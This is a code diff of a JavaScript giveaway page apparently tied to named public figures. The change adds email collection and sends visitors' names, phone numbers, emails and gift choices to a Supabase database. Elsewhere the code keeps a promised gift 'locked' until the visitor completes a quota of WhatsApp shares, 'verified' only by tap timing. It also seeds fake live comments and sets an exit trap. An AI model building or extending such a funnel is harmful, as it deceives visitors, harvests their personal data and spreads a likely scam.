@@ -10,11 +10,11 @@ const GIFTS={
   available:{title:'Any Available Gift',icon:'🎁',claim:'VIEW OTHER AVAILABLE GIFTS'}
 };
 let state={
-  name:'',phone:'',gift:'',stage:'landing',shareProgress:0,shareComplete:false,
+  name:'',phone:'',email:'',gift:'',stage:'landing',shareProgress:0,shareComplete:false,
   liked:false,localLikes:0,localShares:0,userComments:[],liveComments:[],
   commentLikes:{},nextPerson:0,usedCommentSignatures:[],lastTopics:[]
 };
-let shareOpenedAt=0,shareWasOpened=false,lastShareTap=0,allowExit=false;
+let shareOpenedAt=0,shareWasOpened=false,lastShareTap=0,allowExit=false,isSubmitting=false;
 let commentTimer=null,typingTimer=null;
 function load(){try{const x=JSON.parse(localStorage.getItem('pj_fan_gift_modular')||'null');if(x)state={...state,...x}}catch(e){}}
 function save(){try{localStorage.setItem('pj_fan_gift_modular',JSON.stringify(state))}catch(e){}}
@@ -24,24 +24,104 @@ function show(id){
   state.stage=id;save();$('stickyShare').style.display=id==='share'?'block':'none';
   scrollTo({top:0,behavior:'smooth'});if(id==='share')renderShare();if(id==='final')renderFinal();renderFeeds();
 }
-function submitForm(){
-  const name=$('fullName').value.trim(),phone=$('phone').value.replace(/\s+/g,''),gift=$('giftSelect').value;
-  const okName=name.length>=3,okPhone=/^(?:\+?234|0)[789][01]\d{8}$/.test(phone);
-  $('nameError').classList.toggle('show',!okName);$('phoneError').classList.toggle('show',!okPhone);$('giftError').classList.toggle('show',!gift);
-  if(!okName||!okPhone||!gift)return;Object.assign(state,{name,phone,gift});save();
-  $('process').classList.add('show');setTimeout(()=>{$('process').classList.remove('show');show('share')},1600);
+function supabaseHeaders(prefer='return=minimal'){
+  return {
+    'apikey':C.supabase.anonKey,
+    'Authorization':`Bearer ${C.supabase.anonKey}`,
+    'Content-Type':'application/json',
+    'Prefer':prefer
+  };
+}
+async function supabaseRequest(path,options={}){
+  if(!C.supabase?.url||!C.supabase?.anonKey||!C.supabase?.table)throw new Error('Supabase is not configured.');
+  const controller=new AbortController();
+  const timeout=setTimeout(()=>controller.abort(),12000);
+  try{
+    const response=await fetch(`${C.supabase.url}/rest/v1/${path}`,{...options,signal:controller.signal});
+    if(!response.ok){
+      let details='';
+      try{details=await response.text()}catch(e){}
+      throw new Error(`Supabase request failed (${response.status}) ${details}`);
+    }
+    return response;
+  }finally{clearTimeout(timeout)}
+}
+async function saveRegistration(){
+  const record={
+    full_name:state.name,
+    phone:state.phone,
+    email:state.email,
+    gift:state.gift,
+    share_progress:state.shareProgress,
+    share_complete:state.shareComplete,
+    source_page:location.href.split('#')[0],
+    updated_at:new Date().toISOString()
+  };
+  const table=encodeURIComponent(C.supabase.table);
+  await supabaseRequest(`${table}?on_conflict=email`,{
+    method:'POST',
+    headers:supabaseHeaders('resolution=merge-duplicates,return=minimal'),
+    body:JSON.stringify(record)
+  });
+}
+async function syncProgress(){
+  if(!state.email)return;
+  const table=encodeURIComponent(C.supabase.table);
+  const email=encodeURIComponent(state.email);
+  try{
+    await supabaseRequest(`${table}?email=eq.${email}`,{
+      method:'PATCH',
+      headers:supabaseHeaders(),
+      body:JSON.stringify({share_progress:state.shareProgress,share_complete:state.shareComplete,updated_at:new Date().toISOString()})
+    });
+  }catch(error){console.warn('Progress sync failed:',error)}
+}
+async function submitForm(){
+  if(isSubmitting)return;
+  const name=$('fullName').value.trim();
+  const phone=$('phone').value.replace(/\s+/g,'');
+  const email=$('email').value.trim().toLowerCase();
+  const gift=$('giftSelect').value;
+  const okName=name.length>=3;
+  const okPhone=/^(?:\+?234|0)[789][01]\d{8}$/.test(phone);
+  const okEmail=/^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/i.test(email);
+  $('nameError').classList.toggle('show',!okName);
+  $('phoneError').classList.toggle('show',!okPhone);
+  $('emailError').classList.toggle('show',!okEmail);
+  $('giftError').classList.toggle('show',!gift);
+  $('submitError').classList.remove('show');
+  if(!okName||!okPhone||!okEmail||!gift)return;
+  Object.assign(state,{name,phone,email,gift});save();
+  isSubmitting=true;
+  $('submitForm').disabled=true;
+  $('submitForm').textContent='SAVING…';
+  $('process').classList.add('show');
+  try{
+    await saveRegistration();
+    setTimeout(()=>{$('process').classList.remove('show');show('share')},600);
+  }catch(error){
+    console.error(error);
+    $('process').classList.remove('show');
+    $('submitError').classList.add('show');
+    $('submitError').scrollIntoView({behavior:'smooth',block:'center'});
+  }finally{
+    isSubmitting=false;
+    $('submitForm').disabled=false;
+    $('submitForm').textContent='CLICK TO PROCEED';
+  }
 }
 function renderShare(){
   const g=GIFTS[state.gift];$('shareTitle').textContent=`Complete Sharing for Your ${g.title}`;
   $('shareCopy').textContent=`${firstName()}, your gift page is still locked. Complete every required WhatsApp share action below.`;
-  $('giftPill').textContent=`${g.icon} ${g.title}`;updateShare();
+  $('giftPill').textContent=`${g.icon} ${g.title}`;updateShare(false);
 }
-function updateShare(){
+function updateShare(sync=true){
   const pct=Math.min(100,Math.round(state.shareProgress/C.requiredShares*100));state.shareComplete=state.shareProgress>=C.requiredShares;
   $('sharePercent').textContent=pct+'%';$('shareFill').style.width=pct+'%';
   $('shareCount').textContent=`${state.shareProgress} of ${C.requiredShares} share actions completed`;
   $('claimBtn').disabled=!state.shareComplete;$('claimBtn').textContent=state.shareComplete?'CONTINUE TO MY GIFT':'LOCKED — COMPLETE SHARING';
   $('feedback').textContent=state.shareComplete?'Verification complete. Your gift page is now unlocked.':pct>0?'Progress saved. Continue sharing and return here each time.':'No share action has been verified yet.';save();
+  if(sync)syncProgress();
 }
 function openWhatsApp(){
   const now=Date.now();if(now-lastShareTap<C.shareCooldownMs)return;lastShareTap=now;shareWasOpened=true;shareOpenedAt=now;
@@ -138,7 +218,7 @@ $('exitStay').onclick=()=>$('exitModal').classList.remove('show');$('exitLeave')
 document.addEventListener('visibilitychange',()=>{if(!document.hidden)handleReturn()});window.addEventListener('focus',handleReturn);
 load();
 if(!state.liveComments.length){F.seed.forEach((x,i)=>state.liveComments.push({id:'s'+i,n:x[0],t:x[1],replyTo:x[2],l:6+i*4,ts:Date.now()-i*48000,fresh:false}));save()}
-if(state.name){$('fullName').value=state.name;$('phone').value=state.phone;$('giftSelect').value=state.gift}
+if(state.name){$('fullName').value=state.name;$('phone').value=state.phone;$('email').value=state.email||'';$('giftSelect').value=state.gift}
 renderFeeds();scheduleComments();setInterval(()=>renderFeeds(),60000);setupExitTrap();show(state.shareComplete?'final':state.stage==='share'?'share':'landing');
 window.resetPellerJarvisDemo=()=>{localStorage.removeItem('pj_fan_gift_modular');location.reload()};
 })();
